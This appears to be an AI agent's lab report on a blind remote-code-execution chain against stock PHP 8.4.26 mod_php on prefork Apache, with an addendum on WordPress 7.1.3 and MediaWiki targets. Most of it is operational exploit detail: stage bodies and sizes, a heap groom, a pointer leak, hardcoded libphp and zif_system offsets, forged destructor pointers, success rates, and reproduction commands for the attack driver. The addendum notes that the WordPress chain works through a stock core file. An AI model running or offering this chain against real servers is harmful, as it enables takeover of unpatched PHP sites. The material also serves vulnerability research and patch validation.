# 9bie php2shell: blind full chain on stock multi-worker prefork Apache

**Run:** `/tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z`  
**Date:** 2026-10-22  
**Repo under test:** `9bie` php2shell, HEAD `aeb5dcc6acc79c1d9a31c023b4f8ceb43103e5a7` ("make exploit.py the pure-chain entry; archive legacy 8M line"), working tree clean (`git status --porcelain` empty). The repo was never edited, committed, or pushed.

> **Addendum (2026-10-22):** the chain is a concrete exploitation of **CVE-2026-109618 + CVE-2026-109619**, not a new vulnerability. Real WordPress succeeds only with B1 on the stock core `/wp-content/index.php`; MediaWiki and WordPress front-controller B1 fail. PHP 8.5.11 is advisory-affected but does not reproduce with the stock A1; 8.4.27/8.5.12 are fixed. See the addendum at the end for the version matrix, corrections to the single-worker/B-worker/20-20 claims, and the final pass/fail verdict.

---

## Verdict

**YES — the full A1 → B1 → A2 → B2 chain works blind on the tested stock multi-worker prefork Apache, with no single-worker configuration, no pinned sleeper, no `/proc`/gdb, and no target-side helper files.**

- **Fresh stock target, broadcast A2/B2: 5/5 full-chain RCE** (R1–R5).
- **Fresh stock target, single-A2 + B2 rotation: 4/4 full-chain RCE** (R10, R11, R17, R18).
- **Single-worker control, retry-enabled: 6/6** (R21–R26); **no-retry control: 5/6** (R31–R36).
- Every success independently produced `uid=33(www-data) gid=33(www-data) groups=33(www-data)` plus a unique per-attempt marker in `/out/p1_aN`.
- Every success killed exactly one prefork child with `SIGSEGV`; Apache respawned it, and the vhost answered `HTTP/1.1 200 OK` / `OK` immediately afterwards.

The stock bar is met **for this exact build** (`php:8.4.26-apache`, Apache 2.4.69 prefork, stock `php.ini-production`). It is **not** a generic PHP-8.4.26 exploit: offsets and the leak fingerprint are version-specific, and the chain is unreliable on a server that has already served traffic (1/4 warm attempts). See [Limits](#limits-and-what-does-not-transfer).

---

## Target and stock proof

| Item | Value |
|---|---|
| Image | `php:8.4.26-apache` |
| Image ID | `sha256:46b195b6378e712d1a65cd3f853242bebd7f3cb4cafe137fd592b365909d2c17` |
| Digest | `php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a` |
| PHP | 8.4.26 (NTS), mod_php |
| Apache | 2.4.69 (Debian) |
| MPM | `mpm_prefork_module`, stock values `StartServers 5`, `MinSpareServers 5`, `MaxSpareServers 10`, `MaxRequestWorkers 150`, `MaxConnectionsPerChild 0` |
| `php.ini` | byte-identical to `/usr/local/etc/php/php.ini-production`, md5 `fba97f0b3e0b19b0980f5102c0440480` |
| `conf-enabled` | stock set; **no `zz-single.conf`** |
| Container | `p2s-mw-18610`, `127.0.0.1:18610` |
| Initial workers | 5 verified (`docker top`, pre-attempt) |

Receipts: `receipts/target_config_and_workers.txt`, `receipts/control_single_config.txt`, `receipts/vhost_diff.txt` (pristine vs lab vhost).

The only target-side changes are lab instrumentation, not exploit prerequisites:

1. A vhost file that preserves the stock functional directives (`ServerAdmin`, `DocumentRoot`, `ErrorLog`) and replaces the stock `CustomLog .../access.log combined` with a `%P` (child PID) access log; comments were dropped. No MPM, KeepAlive, worker, or PHP setting is changed. (`lab/000-default.conf`, diffed against a pristine image)
2. A 22-byte app endpoint `<?php echo "OK\n"; ?>` at `/var/www/html/index.php`. The chain is engine-level; any PHP endpoint would do.
3. `/out` as a bind mount, used **only** so the target command can write its proof. This is a lab convenience; the repo's `--cmd` supports an out-of-band callback instead.
4. The single-worker control adds the repo's `docker/apache.conf` as `zz-single.conf`; its runtime worker list is exactly one `www-data` process.

---

## Attack design (blind)

Driver: `scripts/chain_blind.py` (plus `scripts/run_attempt.sh` wrapper). It uses only HTTP responses and the target-written proof. It never reads `/proc`, Apache logs, PIDs, gdb, or target-side state while attacking. All retries are independent connections with `Connection: close`; no keep-alive affinity is used.

| Stage | Body | Size | Purpose |
|---|---|---|---|
| A1 | `pure/mk_a1.py` (974 parts) | 1,060,211 B | END-cleanup `send_cookie` OOM; leaves the worker in leak-capable state. Response `500`, 211 B. |
| B1 | `pure/mk_leak_b.py`, `LEAK_SPEC`, fake_len `0xC8000` | 33,128,677 B | Stale-id OOB read; returns a `Set-Cookie` whose URL-decoded value is a pointer window. Hit: ~1.67 MB response, 819,208 decoded bytes. |
| A2 | `pure/cheap_oom_a.py`, 880 parts / depth 64 / 115 fillers | 279,369 B | Cheap OOM; leaves a dangling `PS(http_session_vars)` in that child. Response `500`, 211 B. |
| B2 | `pure/fake_ref_b.py` + `pure/mk_ht.py` (fake ref spray, fake `zend_array`, `pDestructor = libphp+0x465370`) | 451,384 B | Calls `system()` during shutdown. Non-A2 child: `200`, 259 B, no effect. A2 child: command executes, child then `SIGSEGV`s. |

Body hashes (A1/B1 fixed; A2 fixed; B2 embeds the leaked addresses, so its hash varies):

```
8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6  bodies/a1.bin            1,060,211 B
b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2  bodies/b1_800k.bin      33,128,677 B
7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236  A2 body (per run)          279,369 B
(per run, addresses baked in)                                      B2 body (first attempt)    451,384 B
```

Leak validation is the repo's `exploit.parse_leak`: most-common pointer → `libphp = zdtor - 0x65EB60`; main-chunk candidates are the non-libphp, non-id buckets, preferring the count `~87` fingerprint; and `libphp - main` must fall in `0x1A00000..0x1F00000`. In every hit the buckets were `7495 / 1095 / 87 / 79`, with main at the `87` bucket (e.g. R1 `0x7fddeae00000`, libphp `0x7fddeca52000`).

### Routes tested

- **`broadcast`** (primary, explicitly allowed): A2 sent 5 times, B2 up to 5 times with a unique marker per attempt.
- **`single`**: A2 sent **once**, then B2 attempts back-to-back until the proof appears (up to 8). This was added after the phase experiment showed that any request reaching the A2 child destroys the groom.
- **`phase`** (exploratory, failed): after B1, send `N-1` dummy GETs, one A2, `N-1` dummy GETs, one B2, aiming deterministically at the A1/B1 child.

---

## Results

### 1. Fresh stock 5-worker target, broadcast (R1–R5)

Each row is a fresh container restart (fresh ASLR). `B1` is the zero-based attempt index. All five attempts show the same stage-level pattern.

| # | A1 PID | B1 hit | A2 PIDs | B2 i0 | B2 hit | Crash | Proof |
|---|---|---|---|---|---|---|---|
| R1 | 20 | i=4, PID 20 | 21,22,23,19,20 | PID 30, 200/259 | i=1, PID 21 | PID 21 SIGSEGV | `..._A1_b1` |
| R2 | 20 | i=4, PID 20 | 21,22,23,19,20 | PID 30, 200/259 | i=1, PID 21 | PID 21 SIGSEGV | `..._A2_b1` |
| R3 | 20 | i=4, PID 20 | 21,22,23,19,20 | PID 30, 200/259 | i=1, PID 21 | PID 21 SIGSEGV | `..._A3_b1` |
| R4 | 20 | i=4, PID 20 | 21,22,23,19,20 | PID 30, 200/259 | i=1, PID 21 | PID 21 SIGSEGV | `..._A4_b1` |
| R5 | 20 | i=4, PID 20 | 21,22,23,19,20 | PID 30, 200/259 | i=1, PID 21 | PID 21 SIGSEGV | `..._A5_b1` |

- A1: 5/5 `HTTP/1.0 500`, 211 B.
- B1: 5/5 hits, always on the **5th** request (i=4), always served by the A1 child (PID 20) → 25 requests, 5 hits; per-attempt hit rate within N=5 = 100%, per-request = 20%.
- A2: 25/25 `500`, 211 B; the five A2 requests cover the five original children. The spare (PID 30) is the B2 i0 miss.
- B2: 5/5 successes at i=1. B2 i0 on the spare returns `200`/259 B and is harmless; B2 i1 on A2-treated PID 21 executes `system()`, writes the proof, then dies.
- **Full chain: 5/5.** Post-health: `200 OK`, body `OK`, every time.

Exact proof (R1):

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
9BIE_MW_20261022T130520Z_A1_b1
```

Exact crash (R1):

```
[Thu Oct 22 13:25:33.251139 2026] [core:notice] [pid 1:tid 1] AH00052: child pid 21 exit signal Segmentation fault (11)
```

### 2. Fresh stock 5-worker target, single A2 + B2 rotation (R10, R11, R17, R18)

| # | A1 PID | B1 hit | A2 PID | B2 misses (PIDs) | B2 hit | Crash | Proof |
|---|---|---|---|---|---|---|---|
| R10 | 20 | i=4, PID 20 | 31 | 21,22,23,19,20 | i=5, PID 31 | PID 31 SIGSEGV | `..._A10_b5` |
| R11 | 21 | i=4, PID 21 | 22 | 30,23,19,20,21 | i=5, PID 22 | PID 22 SIGSEGV | `..._A11_b5` |
| R17 | 21 | i=4, PID 21 | 22 | 19,30,23,20,21 | i=5, PID 22 | PID 22 SIGSEGV | `..._A17_b5` |
| R18 | 20 | i=4, PID 20 | 21 | 30,22,23,19,20 | i=5, PID 21 | PID 21 SIGSEGV | `..._A18_b5` |

- **4/4 full chain**, all with B1 hit at i=4 and B2 hit at i=5 (the 6th B2 attempt).
- In every case the A2 PID equals the B2 hit PID equals the crash PID: the groom must be in the same child as the fake-ref request.
- The A2/B2 child is not necessarily the A1/B1 child (R10: A1/B1 = 20, A2/B2 = 31). This proves the leaked `main`/`libphp` bases are shared across prefork children forked from the same mod_php parent.
- B2 misses on non-A2 children return `200`/259 B, do not crash, and do not disturb the groom. This is why back-to-back B2 retries work while dummy GETs do not.
- Post-health `200 OK` in all four.

### 3. Phase-aligned dummy routing: negative (R8, R9)

The idea was to use `N-1` harmless GETs to rotate the accept queue so one A2 and one B2 land on the A1/B1 child, avoiding broadcast poisoning. It fails for two independent reasons:

- **R8** assumed 5 workers (`route-n=5`), but the stock parent had forked a 6th spare during the leak. A2 landed on PID 19; the five B2 attempts covered 23, 30, 22, 21, 20 — the only missing child was 19.
- **R9** assumed 6 workers (`route-n=6`), but that run's pool stayed at 5. A2 landed on PID 21; B2 i0–i3 hit 22, 23, 19, 20; B2 i4 hit the A2 child 21 — but four intervening dummy GETs had already hit 21 (13:34:41.085, 41.925, 42.749, 43.584), and B2 at 44.412 returned `200`/259 B with no crash and no proof.

The second result is decisive: **any request that reaches the A2 child after A2 destroys the dangling groom**, so a blind dummy-GET alignment cannot work. Both runs kept the server healthy (`200 OK`), and neither crashed a child.

### 4. Warm server, no restart (R6, R7, R12, R13)

| # | A1 PID | Result | Detail |
|---|---|---|---|
| R6 | 19 | **success** | B1 hit i=4 on 19; A2 ×10; B2 i=0 hit A2-treated 23; crash 23; proof `..._A6_b0` |
| R7 | 20 | fail at B1 | A1 hit PID 20, which had been A2-treated in R6; `zend_mm_heap corrupted` → `AH00052: child pid 20 exit signal Abort (6)`. Ten B1 requests never reached 20 (it was gone), so no leak. |
| R12 | 23 | fail at B1 | A1 on 23 logged the usual 128 MB OOM, but the only B1 request that reached 23 (i=4) returned normal `200`/259 B — no leak. No crash; server healthy. |
| R13 | 19 | fail at B1 | A1 on 19 → `zend_mm_heap corrupted` → `AH00052: child pid 19 exit signal Abort (6)` during the B1 phase; 19 left the rotation. |

**Warm aggregate: 1/4.** Fresh restart restores deterministic behavior. The warm failure modes are distinct:

1. A1 on a warm child can abort it with `zend_mm_heap corrupted`, removing the only child that could leak to B1. In R7 the A1 child had been A2-treated earlier; in R13 the A1 child had served prior B2 traffic.
2. A1 on a warm, traffic-shaped heap can run its OOM but fail to leave the chunk layout B1 expects (R12 is consistent with this; it is the most likely explanation, not separately proven).

R6 shows a warm success is possible, so this is degradation, not a hard invariant.

### 5. Single-worker control (R21–R26 with retries; R31–R36 without)

Control target `p2s-single-18611` on `127.0.0.1:18611`, same image and `php.ini`, with the repo's `docker/apache.conf` installed as `zz-single.conf` (`StartServers 1`, `MinSpareServers 1`, `MaxSpareServers 1`, `MaxRequestWorkers 1`, `ServerLimit 1`, `KeepAlive Off`). Runtime `docker top` shows exactly one `www-data` child.

| Pass | Attempts | Success | Notes |
|---|---|---|---|
| No whole-chain retry | R31–R36 | **5/6** | R36: B1 hit, A2 500, B2 returned 0 bytes and child 19 SIGSEGV'd, but no proof file was written. |
| With whole-chain retry | R21–R26 | **6/6** | All six succeeded on the first chain try (`chain_try=0`), so the retry path was not exercised. |
| Earlier first pass | C11–C16 | 5/6 (historical) | C12's leak was rejected as `implausible_delta`. C11–C13 receipts were later overwritten by reused attempt IDs; see [Receipt integrity](#receipt-integrity). |

The control proves the bodies and the driver are correct end-to-end and that the multi-worker result is not an artifact of the modified vhost or of a hidden single-worker setup. It also shows the chain's intrinsic per-attempt failure rate is not zero even with one worker: the no-retry control fails about 1 in 6, which is exactly why the repo wraps the whole chain in retries.

---

## Worker-level evidence (`%P` attribution)

The access log is the only instrumentation. `%P` is the Apache child PID, and `%D` is request duration in microseconds. `scripts/attribute.py` reconstructs stage→PID after the fact; the attack driver never reads it.

Fresh broadcast (R1–R5), all identical:

```
A1   POST /index.php?q...  500  PID 20
B1   POST /index.php       200  PID 21  miss
B1   POST /index.php       200  PID 22  miss
B1   POST /index.php       200  PID 23  miss
B1   POST /index.php       200  PID 19  miss
B1   POST /index.php       200  PID 20  1,674,363 B  HIT
A2   POST /index.php       500  PID 21
A2   POST /index.php       500  PID 22
A2   POST /index.php       500  PID 23
A2   POST /index.php       500  PID 19
A2   POST /index.php       500  PID 20
B2   POST /index.php       200  PID 30  259 B  (spare, miss)
B2   POST /index.php       --   PID 21  (crash before access log)
```

Two things this shows:

1. **B1 must hit the A1 child.** The A1 state is per-process; the fifth B1 request is the one that reaches PID 20.
2. **A sixth child is likely after the leak.** Stock `MinSpareServers 5` makes the parent fork a spare while a child is busy; the spare (PID 30/31) is the B2 i0 miss in broadcast, and the A2 target in R10. This is stock MPM behavior, not a configuration change. The pool is 6 at chain time, which is why B2 needs up to 6 attempts.

Fresh single (R10):

```
A1 500 PID 20 → B1 hit i=4 PID 20 → A2 500 PID 31
B2 200 PID 21, 22, 23, 19, 20 (misses)
B2 --  PID 31 (system() executes; child SIGSEGV; proof written)
```

The crash PID equals the A2 PID in all four single-route successes, and the A2 PID is in the A2 set in all five broadcast successes. No other child crashes.

Availability evidence:

- `post_health` is `HTTP/1.1 200 OK` / body `OK` for **every** attempt in `receipts/summary.tsv` (including the failures; the failures are exploit-state failures, not server outages).
- `RestartCount=0` for both containers throughout; no container-level restarts were needed for health.
- After R5, 30 sequential GETs returned 200 with zero crashes (`receipts/stability_after_chain.txt`).
- Each successful chain terminates exactly one worker; Apache replaces it transparently.
- Broadcast A2 leaves four other workers A2-treated. They survive normal GETs, but a later A1 on one of them can abort (R7). The single route avoids this: it poisons only the one child that is then consumed by B2.

---

## Why the chain works on multi-worker

1. **Leak stage is per-child, and B1 can be rotated to it.** The driver sends A1 once, then up to N B1 requests. With 5 workers and a sequential accept rotation, the A1 child is reached on the 5th B1 in every fresh run (11/11 across broadcast, phase, and single).
2. **Leaked bases are usable across children, the groom is not.** `libphp` is mapped by the parent before forking, and the PHP main chunk lands at the same address in every child (observed: A2/B2 succeeds on a different child from A1/B1). A2/B2 can therefore run on a different child from A1/B1. But `PS(http_session_vars)` is a per-process dangling pointer, so A2 and B2 must be the same child.
3. **Blind rotation is enough.** Broadcast A2 covers five of six children; the sixth is the spare that B2 i0 hits harmlessly, and B2 i1 hits an A2 child. Single-A2 needs no coverage guess: B2 retries walk the rotation until they reach the one A2 child, which is always the 6th request in the observed 6-child pool.
4. **The crash is post-exploitation.** `system()` writes the proof before the fake destructor corrupts shutdown; the child then segfaults. The proof is on disk before the crash, so the blind driver can verify success without any PID knowledge.

---

## Limits and what does not transfer

These are the boundaries of the claim; none of them weakens the 5/5 + 4/4 fresh stock result.

1. **Exact version/build only.** The offsets are hardcoded for `php:8.4.26-apache`:
   - `libphp = zdtor - 0x65EB60`
   - `zif_system = libphp + 0x465370`
   - `S = main + 0xF8398`
   - plausible `libphp - main` delta `0x1A00000..0x1F00000`
   Any other PHP build, patch level, or distro package needs re-derivation. The leak fingerprint `~87` is also build-specific.
2. **SAPI/MPM.** This is a mod_php prefork chain. It does not apply to PHP-FPM/nginx (no shared fork address space, different request lifecycle). Earlier work in this lab found nginx/FPM negative: with stock `client_max_body_size 1m` A1 gets 413; with 64m A1 OOM-kills the FPM child; B1 is rejected by `post_max_size`.
3. **Fresh server required for reliability.** Warm no-restart chains were 1/4. A real target that has served normal traffic may not have a clean A1 child. A full container restart was verified to restore deterministic behavior; a graceful reload or new worker generation is plausible but was not tested. The chain can also abort a warm child (`zend_mm_heap corrupted`), which is an availability side effect, not a stealthy exploit.
4. **One SIGSEGV per success.** This is inherent to the fake-destructor technique. A monitored target will see `AH00052 ... Segmentation fault` and a respawn. Broadcast additionally leaves up to four A2-treated workers, which can abort on a later A1; the single-A2 route is the lower-collateral choice.
5. **Proof channel.** `/out` is a bind mount and a lab convenience. On a remote target the same chain needs an out-of-band command (the repo's `--cmd`, e.g. an HTTP callback); `id>file` is only convenient here.
6. **App surface.** The test endpoint is a 22-byte `<?php echo "OK\n"; ?>`. The chain is engine-level and does not depend on application logic, but it does require a PHP endpoint that accepts a POST and a request body large enough for the 33 MB B1 upload. Front proxies, WAFs, `post_max_size`/`upload_max_filesize`, and request-rate limits can change the picture; none were in front of this target.
7. **Not tested here:** other PHP 8.4.x patch levels, opcache/JIT configurations, threaded MPMs, multiple vhosts, TLS terminators, real application code, and remote (non-loopback) networks. The report's claim is deliberately scoped to the measured stock image.

---

## Reproduction

Setup (reconstructed from `docker inspect`; the run directory is `$D`):

```bash
D=/tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z

docker run -d --name p2s-mw-18610 -p 127.0.0.1:18610:80 \
  -v "$D/lab/000-default.conf:/etc/apache2/sites-enabled/000-default.conf" \
  -v "$D/lab/www:/var/www/html" \
  -v "$D/out:/out" \
  php:8.4.26-apache

# Single-worker control
docker run -d --name p2s-single-18611 -p 127.0.0.1:18611:80 \
  -v "$D/lab/000-default.conf:/etc/apache2/sites-enabled/000-default.conf" \
  -v "$D/lab/www:/var/www/html" \
  -v "$D/out:/out" \
  -v /tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/docker/apache.conf:/etc/apache2/conf-enabled/zz-single.conf \
  php:8.4.26-apache
```

Attack (broadcast, fresh):

```bash
ROUTE=broadcast NB1=5 NA2=5 NB2=5 CHAIN_RETRIES=1 \
  bash scripts/run_attempt.sh 1 restart
```

Attack (single-A2 + B2 rotation, fresh):

```bash
ROUTE=single NB1=5 NA2=1 NB2=8 CHAIN_RETRIES=1 \
  bash scripts/run_attempt.sh 10 restart
```

Warm (no restart; proof checks retained):

```bash
ROUTE=single NB1=10 NA2=1 NB2=10 CHAIN_RETRIES=1 \
  bash scripts/run_attempt.sh 12 no-restart
```

Control (single worker):

```bash
ROUTE=broadcast NB1=1 NA2=1 NB2=1 CHAIN_RETRIES=1 \
  bash scripts/run_attempt.sh 31 restart p2s-single-18611 18611
```

Attribution and summary:

```bash
python3 scripts/attribute.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \
  21 22 23 24 25 26 31 32 33 34 35 36
python3 scripts/summarize.py
```

The wrapper records `workers_before/after`, `docker.log`, `p2s-access.log`, `/out` listing, container state, and `meta.json` under `receipts/logs/attempt_rN/`. The driver writes `result.json` with per-stage status, byte counts, hashes, elapsed times, leak buckets, hit indices, and proof text.

---

## Receipt integrity

- `receipts/summary.tsv` is generated by `scripts/summarize.py` and lists every attempt with target, mode, route, hit indices, counts, health, and crash signal.
- `receipts/worker_attribution.tsv` is the full stage→PID table; `receipts/worker_attribution.json` is the per-attempt summary.
- Attempt IDs were reused once: the earlier control first pass used IDs 11–16, and the later phase/warm multi-worker runs reused 11–13. **C11–C13 receipt sets were overwritten** and are not relied on. Control conclusions rest on C14–C16 (3/3, surviving receipts), the fresh no-retry pass R31–R36 (5/6), and the retry pass R21–R26 (6/6). The historical first-pass 5/6 (C12 `implausible_delta`) is consistent with the re-run but its C11–C13 logs are gone.
- Attempts 14–16 in `summary.tsv` are single-worker control runs, not multi-worker runs; the `target` column disambiguates.
- The repo is untouched: `HEAD=aeb5dcc6acc79c1d9a31c023b4f8ceb43103e5a7`, `git status --porcelain` empty.
- `SHA256SUMS` covers `scripts/`, `receipts/` (including raw logs), `bodies/`, and `report.md`.

---

## Final answer

**Does the blind 9bie php2shell full chain work on stock multi-worker prefork Apache?**

**Yes, on the measured stock target.** With a fresh `php:8.4.26-apache` container at stock prefork 5/150 and stock `php.ini-production`, using only HTTP responses and blind retries:

- **5/5** full-chain RCE with broadcast A2/B2;
- **4/4** full-chain RCE with a single A2 and B2 rotation;
- **6/6** single-worker control with retries (**5/6** without);
- every success: `uid=33(www-data) ...` + unique marker, one `SIGSEGV` child, `200 OK` availability;
- no single-worker config on the multi-worker target, no `/proc`, no gdb, no pinned sleeper, no target-side helper files.

The stock bar is met **conditionally on a fresh worker generation and this exact build**. Warm-server repetition is 1/4, the technique is version-specific, and it does not transfer to nginx/FPM or patched builds without re-derivation.

---

# Addendum — CVE identity, real applications, PHP-version portability, and corrections

**Addendum run:** 2026-10-22, 14:09–14:37 UTC  
**Base report:** `/tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z/report.md`  
**Addendum evidence:** `/tmp/opencode/research/9bie_addendum_20261022T160000Z/`  
**Repo under test:** unchanged `9bie` php2shell, HEAD `aeb5dcc6acc79c1d9a31c023b4f8ceb43103e5a7`, working tree clean. No repo edits, commits, pushes, credentials, or `/out` dependency in the new evidence.

## Addendum bottom line

The chain is **not a new vulnerability**. It is a concrete two-CVE exploit chain:

- **CVE-2026-109618** / GHSA-w8hw-w9fx-j79w — *RCE via OOM corruption*: the OOM path uses `longjmp()` and leaves request-owned memory in an invalid state. This is the **producer** (A1/A2).
- **CVE-2026-109619** / GHSA-6wmf-4rv5-p3rp — *RCE via stale global state*: stale session globals are read before the next request's normal initialization. This is the **consumer** (B1/B2 stale `PS(rfc1867_progress)` / `PS(id)`).

Both are fixed by commit `506e87fa7dcdd306975e5b8f8265ee03527aacbf` ("Avoid state corruption via bailout") and released in PHP **8.2.35, 8.3.36, 8.4.27, 8.5.12**. PHP **8.4.26 and 8.5.11 are affected**.

Real-application result:

- **WordPress 7.1.3: full blind chain succeeds**, but with a qualification: B1 must run on the stock core `/wp-content/index.php` silence file (28 bytes, `<?php // Silence is golden.`). A2/B2 then succeed on `/` or `/index.php`. B1 on the WordPress front controller `/index.php` does **not** leak.
- **MediaWiki 1.46.2: no full chain** with this B1 shape. Front controller, `action=render`, and `/opensearch_desc.php` all fail at B1.
- **PHP 8.4.26: reproducible.** **PHP 8.4.27 and 8.5.12: fixed, no OOM, no leak.** **PHP 8.5.11: advisory-affected but not reproducible with the stock 8.4.26 A1 body**; the observed A1 state has `send_cookie=0`, so the B1 stale-id window is not reached. This is an exploit-portability failure, not evidence that 8.5.11 is patched.
- **Fresh vs warm:** fresh WordPress **3/3** in the controlled series (6/6 including the earlier fresh variants); warm, no-restart **0/4** in this addendum (original minimal-target warm was 1/4). A warm 1.69 MB B1 response was a heap-shape false positive, not a valid leak.

## 1. Exact CVE / bug / class

### 1.1 Advisory facts

| Item | CVE-2026-109618 | CVE-2026-109619 |
|---|---|---|
| Advisory | GHSA-w8hw-w9fx-j79w | GHSA-6wmf-4rv5-p3rp |
| Title | RCE via OOM corruption | RCE via stale global state |
| Published | 2026-10-21 | 2026-10-21 |
| Affected | `< 8.2.35`, `< 8.3.36`, `< 8.4.27`, `< 8.5.12` | `< 8.2.35`, `< 8.3.36`, `< 8.4.27`, `< 8.5.12` |
| Patched | 8.2.35, 8.3.36, 8.4.27, 8.5.12 | 8.2.35, 8.3.36, 8.4.27, 8.5.12 |
| Role here | OOM producer: corrupted request memory / invalid state | Consumer: stale session globals read before RINIT |
| URLs | https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w | https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp |

Fix commit: https://github.com/php/php-src/commit/506e87fa7dcdd306975e5b8f8265ee03527aacbf  
The commit header explicitly says it fixes both GHSAs:

```
Fix GHSA-w8hw-w9fx-j79w (CVE-2026-109618)
Fix GHSA-6wmf-4rv5-p3rp (CVE-2026-109619)
```

### 1.2 Source mapping in 8.4.26

| Location (8.4.26) | What it does | Relevance |
|---|---|---|
| `Zend/zend_alloc.c:400-426` | `zend_mm_safe_error()` calls `zend_error_noreturn()` inside `zend_try`, then `zend_bailout()` | OOM exits via bailout/longjmp, not a normal unwinding path |
| `Zend/zend.c:1252-1266` | `_zend_bailout()` sets `CG(unclean_shutdown)=1`, clears executor state, and calls `LONGJMP(*EG(bailout), FAILURE)` | Producer mechanism; request shutdown continues with partially reset state |
| `ext/session/session.c:110-122` | `php_rinit_session_globals()` resets `PS(id)`, `PS(session_status)`, handler fields, etc., only at RINIT; it does **not** clear every upload-progress/global pointer | A crash/OOM before/during RINIT can leave request-owned pointers such as `PS(rfc1867_progress)` in globals |
| `ext/session/session.c:3221-3233` | `php_session_rfc1867_callback()` executes, then `progress = PS(rfc1867_progress)` | B1 reads the stale `progress` pointer before normal RINIT replaces it |
| `ext/session/session.c:3308-3309` | On `MULTIPART_EVENT_FORMDATA`, calls `php_rinit_session(0)` and assigns `PS(id)` from `progress->sid` | The A1 OOM can strand a valid/dangling `PS(id)` in the worker |
| `ext/session/session.c:3370-3390` | `MULTIPART_EVENT_END` calls `php_rshutdown_session_globals()` and frees `progress->data` / `progress->sid` | A longjmp before the matching reset/free leaves stale state |
| `main/rfc1867.c:769-775` | Sends `MULTIPART_EVENT_START` to the session callback | Entry point for the session upload-progress callback |
| `main/rfc1867.c:1268-1274` | Sends `MULTIPART_EVENT_END` | Matching cleanup path that OOM can skip |
| `main/rfc1867.c` | **0 occurrences** of `ZEND_HAS_OOM` / `zend_mm_has_oom` in 8.4.26; 8.4.27 has **20** | The vulnerable parser lacked the OOM guards added by the fix |

### 1.3 What the fix changes

The fix does two things that matter to this chain:

1. **Removes the longjmp-based OOM exit** in favor of delayed OOM handling / `UnwindExit`, so an allocation failure no longer abandons request cleanup at an arbitrary point.
2. **Resets session globals at `MULTIPART_EVENT_START`**, before normal RINIT, and adds an `in_rfc1867_update` guard. The 8.4.27 source has:

```c
case MULTIPART_EVENT_START: {
    multipart_event_start *data = (multipart_event_start *) event_data;

    /* This runs before RINIT, so we need to clear these early */
    php_rinit_session_globals();

    progress = ecalloc(1, sizeof(php_session_rfc1867_progress));
    ...
}
```

at `ext/session/session.c:3276-3285` in 8.4.27. The parser also gains OOM checks (`main/rfc1867.c`), and `zend_mm_delayed_error()` replaces immediate fatal bailout in `Zend/zend_alloc.c`.

### 1.4 Is this a variant, a third bug, or a new vulnerability?

No. It is the **combined exploitation** of the two published CVEs:

- A1/A2 are the OOM-corruption producer described by CVE-2026-109618.
- B1/B2 are the stale-global consumer described by CVE-2026-109619.
- The exploit engineering (chunked multipart body, heap groom, fake session id page, forged `zif_system`/`zval_ptr_dtor` pointers) is new work, but the underlying defects are the two known, patched CVEs.
- It is **not** the disputed `session.upload_progress` cached-`zval*` UAF write-up attributed to syrex1013. That write-up is disputed as the root cause by the rdwr-namikb lab; the source-level producer/consumer mapping above is the defensible one.

**Verdict on novelty: FAIL.** This is not a new vulnerability and should not be assigned a new CVE.

## 2. Real-application targets and stock bar

### 2.1 WordPress target

| Item | Value |
|---|---|
| Container | `p2s-wp-18620`, `127.0.0.1:18620` |
| App | WordPress **7.1.3** |
| Web root | `/var/www/html`, mounted **read-only** |
| Active plugins | none (`get_option('active_plugins')` returns empty array) |
| Theme | Twenty Twenty-Five |
| PHP | `php:8.4.26-apache`, PHP 8.4.26 NTS, mod_php |
| Apache | 2.4.69 (Debian), `mpm_prefork_module` |
| Prefork | `StartServers 5`, `MinSpareServers 5`, `MaxSpareServers 10`, `MaxRequestWorkers 150`, `MaxConnectionsPerChild 0` |
| `php.ini` | stock `php.ini-production`, md5 `fba97f0b3e0b19b0980f5102c0440480` |
| `memory_limit` / `post_max_size` | `128M` / `8M` |
| `session.upload_progress.enabled` | `On` (freq `1%`, min_freq `1`) |
| Vhost | stock DocumentRoot, plus a per-child-PID access-log format; **no** `php_value`, no MPM/KeepAlive/worker changes |
| `/out` | absent; target mounts are read-only and include no `/out` bind |

Stock core facts:

- `/wp-content/index.php` is the WordPress core silence file, exactly 28 bytes:
  ```php
  <?php
  // Silence is golden.
  ```
- `/wp-content/plugins/` contains only the bundled `hello.php` and `index.php`; **no active plugins**.
- There is no authentication, no LFI, no plugin/theme upload, and no target-side helper file.
- The old lab `/out` bind is not present. The new proof path is `/tmp/p1_aN` inside the target.

### 2.2 MediaWiki target

| Item | Value |
|---|---|
| Container | `p2s-mw-18621` |
| App | MediaWiki **1.46.2**, core, SQLite lab data |
| PHP | 8.4.26, stock `php.ini-production` |
| Apache | 2.4.69 prefork, stock 5/150 |
| `/index.php?title=Main_Page` | `200 OK` (36,709 bytes) |
| `/index.php` | `301` redirect |
| `/opensearch_desc.php` | `308` redirect |

No third-party MediaWiki extensions were added; `intl` is a PHP extension. The SQLite `LocalSettings.php` is lab configuration, not an app exploit helper.

### 2.3 What "stock" does and does not mean

- Stock Apache prefork values and stock PHP INI are used.
- The only vhost change is the access-log `LogFormat` that records the Apache child PID; no `php_value`, no `SetHandler` change, no single-worker `zz-single.conf`.
- The targets are served from `/` and `/index.php`; the WordPress leak stage additionally uses the stock core `/wp-content/index.php` silence file. That is a real core file, not an app-specific LFI endpoint.
- No host calibration, no `LD_PRELOAD`, no gdb/`/proc` during the blind attack. gdb was used only in separate diagnostic containers after the fact to dump A1 state.

## 3. WordPress results

### 3.1 Why B1 cannot use the front controller

The front controller is reachable, but the B1 leak is not:

| Stage | Path | Result |
|---|---|---|
| A1 | `/wp-content/index.php` | `500`, 211 bytes |
| B1 i0–i3 | `/index.php` | `200`, 69,668 bytes each |
| B1 i4 | `/index.php` | **empty response, 0 bytes** |
| B1 i5 | `/index.php` | `200`, 69,668 bytes |
| A2/B2 | `/index.php` | not attempted after failed B1 |
